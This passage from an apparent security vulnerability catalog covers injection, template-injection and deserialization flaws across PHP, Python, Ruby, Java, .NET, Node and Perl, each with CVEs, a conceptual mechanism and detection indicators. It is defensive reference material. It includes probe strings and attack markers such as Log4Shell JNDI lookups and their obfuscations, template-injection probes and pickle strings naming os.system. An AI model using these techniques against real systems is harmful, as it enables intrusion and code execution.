Passing untrusted input to shell-invoking APIs (Node child_process.exec, Python subprocess with shell=True/os.system, Ruby system/backticks, or building shell strings) lets metacharacters run additional commands; blocklists are bypassed with IFS, brace/wildcard, and variable-substring tricks.

**How it works —** When a language spawns a command through a shell, characters like ; | & $() `` && || split or subshell the intended command. Even argument-array APIs are unsafe if a shell is still invoked or if input becomes an option. Filters that strip spaces or keywords are evaded using ${IFS}, brace expansion, wildcards, and variable-substring expansions (e.g. deriving characters from environment variables). Safe pattern is argument-vector exec without a shell. Conceptual only.

**Where —** Endpoints shelling out to system tools: image/PDF processing, ping/network utilities, git operations, archive handling, and CI runners.

**Detection indicators:**
- Shell metacharacters (; | & $ ` newline) altering command behaviour or timing
- Use of exec/os.system/subprocess(shell=True)/backticks with concatenated input
- Obfuscation artifacts like ${IFS}, wildcards, or ${var:offset:len} in inputs
- Out-of-band DNS/HTTP callbacks from a blind injection probe

**References:** [link](https://hacktricks.wiki/en/pentesting-web/command-injection.html) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) · [link](https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/) · [link](https://semgrep.dev/docs/cheat-sheets/javascript-command-injection)

### PHP Code-Eval Sinks (preg_replace /e, assert, eval, create_function)
*id:* `php-code-eval-sinks` · *severity:* **critical** · *languages:* php · *CVE:* CVE-2015-5731

Several PHP functions evaluate their string arguments as code: the removed preg_replace /e modifier evaluated the replacement, and assert(), eval(), create_function(), and call_user_func on user input all yield code execution.

**How it works —** The /e (PREG_REPLACE_EVAL) modifier caused the replacement string to be executed as PHP after backreference substitution, so control of the subject/replacement enabled RCE; it was deprecated in PHP 5.5 and removed in 7.0 (replaced by preg_replace_callback). assert() with a string argument, eval(), and create_function() likewise compile attacker strings. Detection focuses on these dangerous sinks reachable from input. Conceptual only.

**Where —** Legacy templating/routing, plugin systems, and math/expression features that pass user input to eval-family functions or use preg_replace with /e on old PHP.

**Detection indicators:**
- Source using preg_replace with the /e pattern modifier
- assert(), eval(), create_function(), or call_user_func with request-derived strings
- 'The /e modifier is no longer supported' warnings on PHP 7+
- Backtick or ${...} sequences reflected into a regex replacement

**References:** [link](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier) · [link](https://www.madirish.net/402) · [link](https://hacktricks.wiki/en/pentesting-web/command-injection.html) · [link](https://www.php.net/manual/en/function.preg-replace.php)

### PHP Local File Inclusion to RCE (log/wrapper/phar/session)
*id:* `php-lfi-to-rce` · *severity:* **critical** · *languages:* php · *CVE:* CVE-2018-20434, CVE-2024-2961

An include/require sink taking attacker-controlled paths can be escalated from file disclosure to code execution via log poisoning, PHP wrappers, phar:// metadata deserialization, session file poisoning, and /proc/self/environ.

**How it works —** If user input reaches include/require, the attacker first reads source via php://filter (e.g. base64-encode conversion) then achieves execution by making the include target attacker-controlled PHP: poisoning web/SSH/mail logs with PHP in a header and including the log; writing PHP into a PHP session file and including it; smuggling a phar:// path so archive metadata is unserialized against a gadget chain (Secarma/Sam Thomas research); or data:// and expect:// wrappers where enabled. Conceptual only.

**Where —** Legacy PHP routing/localization params (?page=, ?lang=), template loaders, and file-download endpoints where allow_url_include or unsanitized paths reach an include.

**Detection indicators:**
- Path traversal sequences and null-byte/wrapper prefixes in include parameters
- php://filter, phar://, data://, expect:// schemes in requests
- Reflected file contents or base64 blobs matching source files
- Controllable values later appearing inside readable log/session files

**References:** [link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) · [link](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)

### Jinja2 Server-Side Template Injection & Sandbox Escape
*id:* `python-jinja2-ssti-sandbox-escape` · *severity:* **critical** · *languages:* python · *CVE:* CVE-2016-10745, CVE-2019-8341

User input concatenated into a Jinja2 template (rather than passed as data) is evaluated as template expressions, letting an attacker pivot through Python's object graph to reach OS command primitives and break out of Jinja2's SandboxedEnvironment.

**How it works —** When templates are built with render_template_string or string formatting on attacker-controlled data, Jinja2 evaluates the injected expression. The attacker walks Python dunder attributes (from an exposed object to its class, method-resolution order, subclasses list, module globals, and builtins) to locate callables that spawn processes or read files. SandboxedEnvironment restricts unsafe attribute access, but escapes historically exist via objects reachable from the render context, via string filters/aliases, and via the Flask request/config objects. Conceptual only; no payloads provided.

**Where —** Flask/Django/Bottle apps that interpolate user input into template source; email/notification template features; any code passing untrusted strings to Template()/render_template_string.

**Detection indicators:**
- Mathematical evaluation of injected expressions (7*7 rendering as 49)
- String multiplication rendering (7 times '7' -> 7777777)
- Jinja2 traceback/exception strings leaking in responses
- Reflection of framework objects such as config or request
- Differential behaviour between {{ }} and {% %} probe syntaxes

**References:** [link](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) · [link](https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3) · [link](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) · [link](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)

### Ruby ERB / Templating Server-Side Template Injection
*id:* `ruby-erb-ssti` · *severity:* **critical** · *languages:* ruby · *CVE:* CVE-2016-2098

User input embedded into ERB (or Erubis/Slim/Haml/Liquid unsafely) is evaluated as Ruby, giving direct access to Kernel methods such as system, backticks, and IO.popen for RCE.

**How it works —** ERB compiles <%= %> / <% %> tags into Ruby that runs with full interpreter privileges, so any interpolation of untrusted data into the template source executes arbitrary Ruby. Unlike sandboxed engines, ERB has no sandbox by default. Rails render :inline and dynamic template composition are common sinks. Detection uses arithmetic probes; exploitation reaches command execution helpers. Conceptual only.

**Where —** Rails render inline/dynamic templates, report/email builders, low-code form templates, and any ERB.new(user_input).result.

**Detection indicators:**
- Arithmetic probe in ERB tags evaluating (e.g. <%= 7*7 %> yielding 49)
- Use of ERB.new, Erubi/Erubis, or render inline with user data
- Ruby exception traces (SyntaxError/NameError) leaking on malformed tags
- Differential rendering between literal and evaluated probes

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md) · [link](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/ruby-tricks.html) · [link](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti)

### Ruby Marshal Universal Deserialization Gadget Chain
*id:* `ruby-marshal-deserialization` · *severity:* **critical** · *languages:* ruby · *CVE:* CVE-2022-32224

Marshal.load on attacker-controlled bytes triggers marshal_load/instance callbacks; public universal gadget chains using only default gems achieve arbitrary command execution for Ruby 2.x through 3.x.

**How it works —** Classes implementing marshal_load (or similar deserialization hooks) run code when their objects are reconstructed. Researchers (elttam, William Bowling/devcraft, and later updates) published universal chains stitching together stdlib classes (Gem, Net, etc.) so that Marshal.load of a crafted blob reaches a command-execution sink without app-specific gadgets; the same idea extends to unsafe YAML.load. Conceptual only.

**Where —** Session stores, caches, cookies, and message queues that Marshal.load untrusted data; Rails apps with attacker-reachable Marshal sinks.

**Detection indicators:**
- Marshal binary signature (leading bytes 0x04 0x08) in cookies/params/caches
- Codebase calls to Marshal.load on request-derived data
- Blobs decoding to Ruby object graphs referencing Gem::/Net:: classes
- Unexplained process execution following deserialization

**References:** [link](https://www.elttam.com/blog/ruby-deserialization) · [link](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) · [link](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/) · [link](https://nastystereo.com/security/ruby-3.4-deserialization.html)

### Server-Side Template Injection → RCE (Jinja2)
*id:* `ssti-jinja2-rce` · *severity:* **critical** · *languages:* python

User input rendered as a Jinja2 template escapes the sandbox via Python object introspection to reach os-level command execution.

**How it works —** From an evaluated {{ }} context, walk __class__/__mro__/__subclasses__ to a class exposing os/subprocess — the classic SSTI-to-RCE pivot.

**Where —** Flask/Jinja2 apps that render user input as template source.

**Detection indicators:**
- {{7*7}} → 49
- {{7*'7'}} → 7777777 (Jinja2/Python)
- TemplateSyntaxError in responses

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) · [link](https://portswigger.net/research/server-side-template-injection)

### Go Template Injection & SSRF Primitives
*id:* `go-template-injection-ssrf` · *severity:* **high** · *languages:* go · *CVE:* CVE-2023-29401

Go's text/template and html/template are 'safe by default' for escaping only; when user input controls template source or registered FuncMap methods are reachable, method-call syntax yields file read and RCE, while Go HTTP clients readily enable SSRF.

**How it works —** text/template permits calling methods and exported functions on the pipeline data; if the data value exposes a method that runs commands or reads files, {{ .Method arg }} syntax invokes it, and text/template (unlike html/template) does no contextual output escaping. Method-confusion research shows how passing a matching-typed argument reaches unintended methods for file read/RCE. Separately, Go's default net/http client follows attacker URLs, enabling SSRF when request data drives outbound fetches. Conceptual only.

**Where —** Go apps letting users influence template bodies or FuncMap-exposed helpers; webhook/URL-fetch/image-proxy features using http.Get on user URLs.

**Detection indicators:**
- User-controlled template source reaching template.New().Parse
- Method-call syntax {{ .X ... }} evaluating against request data
- Exposed struct methods touching os/exec, os, or io in template context
- Outbound requests to attacker-specified hosts / cloud metadata endpoints

**References:** [link](https://onsecurity.io/article/go-ssti-method-research/) · [link](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) · [link](https://www.oligo.security/blog/safe-by-default-or-vulnerable-by-design-golang-server-side-template-injection) · [link](https://snyk.io/articles/understanding-server-side-template-injection-in-golang/)

### Library Injection: LD_PRELOAD & DLL Hijacking
*id:* `library-injection-ldpreload-dllhijack` · *severity:* **high** · *languages:* c, python · *CVE:* CVE-2010-3190, CVE-2023-38831

Forcing a target process to load an attacker library. On Linux, LD_PRELOAD/LD_LIBRARY_PATH (or /etc/ld.so.preload) inject a shared object whose constructors run first — a persistence/rootkit and privesc vector when combined with sudo env leakage or setuid quirks. On Windows, DLL search-order hijacking and phantom/side-loading drop a rogue DLL where a trusted app resolves it.

**How it works —** conceptual — no working exploit

**Where —** Dynamic linkers (glibc ld.so, Windows loader). LD_PRELOAD is stripped for setuid binaries but abused via misconfigured sudo env_keep; Windows hijack relies on writable directories earlier in the DLL search path.

**Detection indicators:**
- unexpected LD_PRELOAD / LD_LIBRARY_PATH or /etc/ld.so.preload entries
- userland-rootkit .so hooking libc functions
- DLLs loaded from a user-writable dir instead of System32
- signed apps side-loading unsigned DLLs from their working directory

**References:** [link](https://github.com/gaffe23/linux-inject) · [link](https://github.com/Mr-Un1k0d3r/DLLHijackingBypass) · [link](https://man7.org/linux/man-pages/man8/ld.so.8.html) · [link](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

### Perl Two-Argument open() Pipe Injection
*id:* `perl-2arg-open-injection` · *severity:* **high** · *languages:* perl · *CVE:* CVE-2016-1238

Perl's two-argument open() interprets a leading or trailing pipe character in the filename as a command to spawn, so unsanitized user input in the two-arg form leads to arbitrary command execution.

**How it works —** In open(FH, EXPR) the mode and filename share one string; if EXPR begins with '|' the value is run as a command feeding the handle (and a trailing '|' pipes command output in). Attacker-controlled filenames therefore become shell commands. Related Perl sinks include backticks, system with a shell, and unsafe open on user data. The fix is the three-argument open, which treats the value strictly as a filename. Conceptual only.

**Where —** Legacy CGI/Perl scripts opening user-named files or logs, report generators, and admin tooling using the two-argument open form.

**Detection indicators:**
- User input reaching two-argument open() (no explicit mode argument)
- Filenames beginning or ending with the pipe character
- Perl code using open(FH, $userinput) rather than open(FH, '<', $userinput)
- Command output or timing effects from pipe-wrapped filenames

**References:** [link](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543) · [link](https://hacktricks.wiki/en/pentesting-web/command-injection.html) · [link](https://perldoc.perl.org/functions/open) · [link](https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html)

### PHP Loose Comparison Type Juggling & Magic Hashes
*id:* `php-type-juggling` · *severity:* **high** · *languages:* php · *CVE:* CVE-2015-8617

PHP's loose == comparison coerces operands before comparing; strings interpreted as numbers (including 0e-prefixed 'magic hashes') can bypass authentication, HMAC, and token checks that use == instead of ===.

**How it works —** With ==, PHP (pre-8.0) casts numeric-looking strings to numbers, so two hashes both formatted like 0e followed only by digits both coerce to 0 and compare equal, and comparisons like '0' == 'string' or in_array loose mode behave surprisingly. Attackers craft inputs whose md5/sha1 begins with 0e (magic hashes) to defeat password/HMAC equality, or abuse strcmp-returns-null-on-array quirks. PHP 8's saner string-to-number RFC removes most of this. Conceptual only.

**Where —** Login/token/HMAC verification, password reset comparisons, API signature checks, and switch/in_array logic using == / != on user input.

**Detection indicators:**
- Authentication or signature code using == instead of ===
- Hash values or tokens formatted as 0e followed only by digits
- Acceptance of arrays where scalars expected (strcmp/hash bypass)
- PHP version earlier than 8.0 in loose-comparison code paths

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling) · [link](https://github.com/spaze/hashes) · [link](https://www.php.net/manual/en/types.comparisons.php) · [link](https://secops.group/blog/php-type-juggling-simplified/)

### Python str.format / Format-String Attribute Traversal
*id:* `python-str-format-attribute-traversal` · *severity:* **high** · *languages:* python · *CVE:* CVE-2023-41419

When an attacker controls the format string passed to str.format (or Formatter), field-name syntax allows attribute and index access, enabling traversal from exposed objects to __globals__ and leakage of secrets such as config keys.

**How it works —** New-style formatting resolves replacement fields by attribute (.attr) and item ([key]) access on the supplied arguments. A malicious format string can chain from a benign object to its class, initializer, and module globals dict to read sensitive values (SECRET_KEY, credentials). Unlike f-strings, the template itself is data, so untrusted templates (translations, user-supplied report formats) are the risk. It is primarily an information-disclosure primitive that can escalate. Conceptual only.

**Where —** i18n/translation strings, user-defined report/label templates, logging format templates, and any '{...}'.format(obj) where the literal is attacker-influenced.

**Detection indicators:**
- Format fields performing attribute/index access such as {0.__class__} or {obj[__globals__]}
- User-controllable strings reaching .format() or string.Formatter
- Leaked globals/config values in rendered output
- Errors like 'Access to attribute is forbidden' from hardened formatters

**References:** [link](https://github.com/lovasoa/pyformat-challenge) · [link](https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-8xv7-89vj-q48c) · [link](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) · [link](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)

### Ruby Kernel#open / IO.popen Pipe Command Injection
*id:* `ruby-kernel-open-pipe` · *severity:* **high** · *languages:* ruby · *CVE:* CVE-2017-0904

Ruby's Kernel#open (and paths using IO/URI open) treat an argument beginning with a pipe character as a command to spawn, so unsanitized user input passed to open() can execute OS commands.

**How it works —** Historically Kernel#open interprets a leading '|' in its argument as a subprocess to run rather than a filename, meaning open(user_input) where the input starts with a pipe launches a shell command. Related sinks include IO.popen, system/exec/backticks, and open-uri patterns. Modern guidance is to use File.open explicitly and never pass untrusted data to Kernel#open. Conceptual only.

**Where —** File-fetch/preview features, image/URL loaders, and legacy code calling open() on user-supplied filenames or URLs.

**Detection indicators:**
- Parameters beginning with the pipe character reaching an open() call
- Source using Kernel#open / open-uri with user input instead of File.open
- IO.popen, %x{}, system, or exec with interpolated request data
- Command output or timing effects from pipe-prefixed inputs

**References:** [link](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/ruby-tricks.html) · [link](https://semgrep.dev/docs/cheat-sheets/ruby-command-injection) · [link](https://semgrep.dev/docs/cheat-sheets/ruby-command-injection)


## Deserialization (`deserialization`)

### .NET BinaryFormatter / LosFormatter / SoapFormatter Deserialization (ysoserial.net)
*id:* `dotnet-binaryformatter-losformatter-soap` · *severity:* **critical** · *languages:* .net · *CVE:* CVE-2017-9822, CVE-2018-8421, CVE-2019-18935

Legacy .NET formatters (BinaryFormatter, LosFormatter, SoapFormatter, NetDataContractSerializer) reconstruct fully typed object graphs and invoke deserialization callbacks, enabling gadget chains (e.g. ObjectDataProvider, TypeConfuseDelegate, TextFormattingRunProperties) that reach arbitrary command execution. ysoserial.net catalogs these.

**How it works —** The attacker serializes a gadget object graph with a type-aware formatter so that set-on-deserialization members or callbacks drive a WPF/WinForms class (commonly ObjectDataProvider) to invoke an arbitrary method such as a process launcher. ysoserial.net enumerates formatters and gadgets conceptually. No payloads reproduced.

**Where —** Endpoints deserializing untrusted data with BinaryFormatter/LosFormatter/SoapFormatter/NetDataContractSerializer: session/cache blobs, remoting, WCF, file uploads, message queues.

**Detection indicators:**
- BinaryFormatter stream header bytes 00 01 00 00 00 FF FF FF FF -> base64 'AAEAAAD/////'
- Embedded assembly/type strings: System.Windows.Data.ObjectDataProvider, PresentationFramework, System.Runtime.Remoting
- MethodName/TypeName/AssemblyName records inside the blob
- LosFormatter/base64 blobs (see ViewState) with typed records

**References:** [link](https://github.com/pwntester/ysoserial.net) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md) · [link](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) · [link](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/DotNET/)

### .NET Json.NET TypeNameHandling / JavaScriptSerializer Type Confusion
*id:* `dotnet-jsonnet-typenamehandling` · *severity:* **critical** · *languages:* .net · *CVE:* CVE-2019-18935, CVE-2017-11317, CVE-2017-11357

Newtonsoft Json.NET with TypeNameHandling other than None (and JavaScriptSerializer with a permissive SimpleTypeResolver) embeds and honors a $type field, letting an attacker instantiate arbitrary CLR types and drive gadget chains (ObjectDataProvider, etc.) to RCE - exactly as demonstrated in 'Friday the 13th: JSON Attacks'.

**How it works —** The attacker sets the $type discriminator to a dangerous class and supplies member values so that property setters invoked during binding reach a method-invocation gadget. The Telerik RadAsyncUpload RCE is a real-world instance via JavaScriptSerializer type resolution. Conceptual only.

**Where —** APIs deserializing untrusted JSON with TypeNameHandling.Auto/All/Objects, JavaScriptSerializer with a JavaScriptTypeResolver, or FastJson/other typed JSON binders.

**Detection indicators:**
- JSON '$type' property with fully-qualified 'Namespace.Type, Assembly' value
- Type strings like 'System.Windows.Data.ObjectDataProvider, PresentationFramework'
- Type strings referencing System.Configuration.Install.AssemblyInstaller or System.Diagnostics.Process
- rauPostData / RadAsyncUpload configuration objects (Telerik)

**References:** [link](https://github.com/pwntester/ysoserial.net) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md) · [link](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) · [link](https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui)

### ASP.NET ViewState Deserialization via Known/Leaked machineKey
*id:* `dotnet-viewstate-machinekey` · *severity:* **critical** · *languages:* .net · *CVE:* CVE-2020-0688, CVE-2021-31207

__VIEWSTATE is a LosFormatter-serialized object graph protected by the machineKey validationKey/decryptionKey. If those keys are known, static, or leaked (as in Exchange CVE-2020-0688), an attacker forges a MAC-valid ViewState carrying a ysoserial.net gadget, which the server deserializes into SYSTEM-level RCE.

**How it works —** With valid keys, the attacker signs (and optionally encrypts) a crafted LosFormatter payload embedding a .NET gadget chain and submits it as __VIEWSTATE; the server validates the MAC, deserializes, and detonates the chain. ysoserial.net's ViewState plugin models this. Conceptual only - keys are a prerequisite.

**Where —** ASP.NET Web Forms pages using ViewState, especially with EnableViewStateMac weaknesses or hardcoded/leaked machineKey (Exchange ECP, custom apps with default keys).

**Detection indicators:**
- '__VIEWSTATE' parameter, base64 often starting '/wEP' (LosFormatter)
- '__VIEWSTATEGENERATOR' and '__VIEWSTATEENCRYPTED' fields
- __VIEWSTATE unexpectedly sent in a GET request
- Abnormally large ViewState blobs / MAC validation failures in logs
- Decoded blob containing typed BinaryFormatter records (see AAEAAAD/////)

**References:** [link](https://github.com/pwntester/ysoserial.net) · [link](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs) · [link](https://securitylab.github.com/research/exchange-rce-CVE-2020-0688/) · [link](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)

### Java JSON Polymorphic Type Handling (Fastjson autoType / Jackson default typing)
*id:* `java-fastjson-jackson-autotype` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2022-25845, CVE-2017-18349, CVE-2019-12384

JSON libraries that embed the concrete class name in the document and instantiate it during parsing (Fastjson @type, Jackson enableDefaultTyping) let an attacker name a dangerous class whose setters/constructors reach a JNDI lookup or other sink, yielding RCE despite JSON being assumed 'safe'.

**How it works —** The attacker includes a type-hint field naming a gadget class (e.g. a JdbcRowSetImpl-style rowset whose data-source setter performs a JNDI lookup, or a template-based class). The parser reflectively instantiates it and invokes property setters during binding, driving control into a JNDI/RMI/LDAP or expression sink. Fastjson maintains an autoType blocklist that has been repeatedly bypassed. Conceptual only.

**Where —** Endpoints binding untrusted JSON into Object/abstract types with Fastjson JSON.parse/parseObject or Jackson polymorphic/default typing enabled.

**Detection indicators:**
- JSON field '@type' (Fastjson) naming a fully-qualified class
- Jackson type wrappers like ["class.name", {...}] with default typing
- Dangerous class names in JSON: com.sun.rowset.JdbcRowSetImpl, com.sun.org.apache.xalan..., TemplatesImpl
- Outbound JNDI/LDAP/RMI callbacks triggered by JSON parsing

**References:** [link](https://github.com/frohoff/ysoserial) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md) · [link](https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/) · [link](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)

### Java JNDI Injection via RMI/LDAP Remote Reference (marshalsec)
*id:* `java-jndi-injection-rmi-ldap` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2021-44228, CVE-2018-3149, CVE-2019-2725

When an application performs a JNDI lookup on an attacker-controlled name, the attacker points it at a malicious RMI/LDAP server that returns a JNDI Reference (or serialized gadget), leading to remote-class loading or triggering of a deserialization gadget chain and remote code execution. This is the core mechanism behind Log4Shell.

**How it works —** The attacker supplies an ldap://, rmi:// or dns:// URI to a vulnerable Context.lookup(). marshalsec runs a rogue LDAPRefServer/RMIRefServer that answers with a JNDI Reference whose factory/codebase is attacker-controlled; on older JVMs this triggers remote classloading, and on hardened JVMs it can still return a serialized object that detonates a local gadget chain (e.g. via ysoserial). Conceptual only.

**Where —** JNDI lookups over user input; Log4j message interpolation (${jndi:...}); Fastjson/Jackson JdbcRowSetImpl; RMI registries; Spring, Hibernate validator, and other libraries doing name lookups.

**Detection indicators:**
- JNDI URIs in inputs/logs: ldap://, ldaps://, rmi://, dns:// pointing to external hosts
- Log4Shell pattern ${jndi:ldap://...} (and obfuscations like ${lower:j}ndi, ${${::-j}ndi:})
- Class name com.sun.rowset.JdbcRowSetImpl in JSON/XML
- Outbound LDAP (389/636) or RMI (1099) connections from an app server
- javax.naming.Reference / RemoteObjectInvocationHandler in returned streams

**References:** [link](https://github.com/mbechler/marshalsec) · [link](https://github.com/mbechler/marshalsec/blob/master/README.md) · [link](https://mbechler.github.io/2018/11/01/Java-CVE-2018-3149/) · [link](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)

### Java Native Deserialization (ObjectInputStream) via ysoserial Gadget Chains
*id:* `java-native-deserialization-commonscollections` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2015-4852, CVE-2015-7501, CVE-2015-8103, CVE-2016-3510

Passing attacker-controlled bytes to java.io.ObjectInputStream.readObject() lets an attacker reconstruct a graph of objects whose deserialization callbacks (readObject/readResolve) invoke a chain of pre-existing library methods (a POP gadget chain) ending in arbitrary command execution. Apache Commons Collections was the first widely weaponized gadget source.

**How it works —** Property-oriented programming: an attacker serializes a nested object graph that, on deserialization, walks through 'gadget' classes on the target classpath (e.g. Commons Collections Transformer/InvokerTransformer, LazyMap, Spring, Groovy, JDK AnnotationInvocationHandler) so that reflective method dispatch is ultimately steered into a runtime command execution sink. No exploit code is reproduced here; ysoserial catalogs the chains conceptually (CommonsCollections1-7, Spring1/2, Groovy1, etc.).

**Where —** Any endpoint deserializing untrusted native Java objects: RMI/JMX, JBoss/WebLogic/WebSphere T3 or HTTP invoker, JSF/ViewState-like tokens, Java-serialized HTTP parameters or cookies, message queues.

**Detection indicators:**
- Raw magic bytes 0xAC 0xED 0x00 0x05 (STREAM_MAGIC + version)
- Base64 payloads beginning 'rO0AB' (and 'rO0' prefix)
- Gzip-then-base64 payloads beginning 'H4sIA'
- Content-Type: application/x-java-serialized-object
- Embedded readable class strings e.g. org.apache.commons.collections.functors.InvokerTransformer, sun.reflect.annotation.AnnotationInvocationHandler

**References:** [link](https://github.com/frohoff/ysoserial) · [link](https://github.com/frohoff/ysoserial/blob/master/README.md) · [link](https://www.klogixsecurity.com/scorpion-labs-blog/gadget-chains) · [link](https://portswigger.net/web-security/deserialization) · [link](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

### Node.js Function-Injection Deserialization (node-serialize, funcster)
*id:* `nodejs-function-injection-deserialization` · *severity:* **critical** · *languages:* node.js · *CVE:* CVE-2017-5941, CVE-2017-5954

Libraries that serialize JavaScript functions and rebuild them with eval/Function on load (node-serialize, funcster, serialize-to-js) allow RCE: an attacker submits a serialized 'function' that, via an Immediately Invoked Function Expression, executes when the object is deserialized. node-serialize is CVE-2017-5941.

**How it works —** node-serialize encodes functions with a marker and reconstructs them via eval during unserialize(); appending IIFE parentheses to the function body causes immediate execution on load. funcster/serialize-to-js reconstruct functions in a module/sandbox wrapper that can likewise be escaped. Conceptual only - no payloads reproduced.

**Where —** Endpoints passing untrusted JSON to node-serialize.unserialize(), funcster.deepDeserialize(), or serialize-to-js.deserialize() (cookies, request bodies, cache).

**Detection indicators:**
- node-serialize function marker '_$$ND_FUNC$$_'
- JSON containing 'function (...) { ... }()' (IIFE trailing parentheses)
- funcster marker '__js_function' and module-wrapper strings
- serialize-to-js function/regexp encodings passed to deserialize()

**References:** [link](https://nvd.nist.gov/vuln/detail/CVE-2017-5941) · [link](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf) · [link](https://portswigger.net/web-security/deserialization) · [link](https://www.acunetix.com/vulnerabilities/web/node-serialize-insecure-deserialization/)

### Python pickle Arbitrary Code Execution (__reduce__)
*id:* `python-pickle-rce` · *severity:* **critical** · *languages:* python

pickle.load/loads on untrusted data is RCE by design: the __reduce__ protocol lets any object declare a callable plus arguments to run at unpickling time, so a crafted stream can invoke os.system/subprocess/eval directly. Modules built on pickle (joblib, torch.load defaults, celery, cached objects) inherit the flaw.

**How it works —** The attacker builds a pickle stream whose GLOBAL/REDUCE opcodes resolve an arbitrary callable (e.g. a builtin exec/eval or os.system) and call it with attacker-supplied args when the stream is loaded. Because opcodes are interpreted by a virtual machine, no application gadget is needed. Conceptual only.

**Where —** pickle.loads over network/session/cache/model files; unsafe torch.load / joblib.load / pandas.read_pickle / numpy.load(allow_pickle=True); any deserialization of untrusted .pkl artifacts.

**Detection indicators:**
- Protocol marker opcode 0x80 followed by version (e.g. \x80\x04)
- Base64 pickle prefixes 'gAI' (proto 2), 'gAS'/'gASV' (proto 4), 'gAU' (proto 5)
- Opcodes c (GLOBAL), \x93 (STACK_GLOBAL), R (REDUCE), b (BUILD), . (STOP)
- Readable stack-global strings like 'cposix\nsystem' or 'c__builtin__\neval'

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md) · [link](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/) · [link](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) · [link](https://portswigger.net/web-security/deserialization)

### PyYAML Unsafe Load (yaml.load / FullLoader python tags)
*id:* `python-pyyaml-unsafe-load` · *severity:* **critical** · *languages:* python · *CVE:* CVE-2017-18342, CVE-2020-1747, CVE-2020-14343

yaml.load() without a safe loader (or full_load/FullLoader before hardening) resolves Python-specific YAML tags, letting an attacker instantiate arbitrary objects or invoke callables during parsing - effectively pickle-grade RCE from a YAML document.

**How it works —** The attacker supplies YAML using python-object/apply or python-object/new tags to name a callable/class and its arguments, which PyYAML resolves and invokes while constructing the document. PyYAML 5.1 deprecated bare load(), and 5.4 moved arbitrary tags to UnsafeLoader; SafeLoader/safe_load blocks these tags. Conceptual only.

**Where —** Config/template ingestion, API bodies, CI pipelines, or plugin metadata parsed with yaml.load()/full_load() on untrusted input.

**Detection indicators:**
- YAML tags '!!python/object/apply:', '!!python/object/new:', '!!python/object:'
- Tags '!!python/name:' and '!!python/module:'
- Constructor arguments naming os.system/subprocess/eval after such tags

**References:** [link](https://www.sourcery.ai/vulnerabilities/python-pyyaml-unsafe-load-rce) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md) · [link](https://hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html) · [link](https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html)

### Ruby Marshal.load Universal Deserialization Gadget Chain
*id:* `ruby-marshal-universal-gadget` · *severity:* **critical** · *languages:* ruby · *CVE:* CVE-2022-32224, CVE-2013-0156

